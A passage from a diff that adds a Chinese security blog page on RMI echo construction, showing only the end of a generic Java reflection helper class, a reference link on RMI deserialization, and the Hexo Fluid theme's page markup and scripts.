class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List <span class="hljs-title function_">getFieldObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object object)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        list.add(field.get(object));<br>        <span class="hljs-keyword">return</span> list;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map&lt;String, Object&gt; <span class="hljs-title function_">createMap</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String key, <span class="hljs-keyword">final</span> Object val)</span> &#123;<br>        <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>        map.put(key, val);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">RMI反序列化</a></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java/" class="print-no-link">#Java</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>RMI 回显构造</div>
+      <div>http://www.weijin.ink/2023/09/04/RMI-回显构造/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>未尽</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/30/XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-class-%E6%A0%87%E7%AD%BE/" title="XMLDecoder 反序列化之 class 标签">
+                        <span class="hidden-mobile">XMLDecoder 反序列化之 class 标签</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://weijinblog830.zeabur.app","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
